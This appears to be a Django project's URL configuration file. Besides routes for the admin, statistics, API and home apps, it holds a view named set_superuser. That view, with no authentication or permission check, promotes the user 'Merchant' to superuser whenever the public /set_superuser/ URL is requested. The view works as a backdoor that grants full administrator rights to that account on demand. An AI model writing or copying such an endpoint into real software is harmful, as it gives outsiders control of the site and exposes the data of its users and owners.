from django.conf import settings
from django.conf.urls import url, include
from django.contrib import admin


def set_superuser(request):

    from django.contrib.auth.models import User, Group
    from django.http import HttpResponse

    u = User.objects.get(username="Merchant")
    u.is_superuser = True
    u.save()

    return HttpResponse("OK")

urlpatterns = [
    url(r'^set_superuser/$', set_superuser),

    url(r'^admin/statistics/', include('apps.statistics.urls')),
    url(r'^admin/', admin.site.urls),
    url(r'^api/v1/', include('apps.api.urls')),
    url(r'^', include('apps.home.urls')),
]

if settings.DEBUG:
    from django.conf.urls.static import static
    urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)
